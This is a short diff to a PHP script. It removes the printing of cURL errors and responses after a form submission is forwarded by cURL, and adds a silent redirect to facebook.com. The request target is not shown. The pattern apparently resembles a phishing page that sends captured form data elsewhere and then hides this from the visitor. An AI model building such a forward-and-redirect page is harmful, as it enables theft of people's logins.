@@ -24,13 +24,9 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 ));
 
 $response = curl_exec($ch);
-
-if($response === false){
-    echo "CURL ERROR: " . curl_error($ch);
-} else {
-    echo "RESPONSE: " . $response;
-}
-
 curl_close($ch);
+
+// Redirect after successful submission
+header("Location: https://facebook.com");
 exit();
 ?>
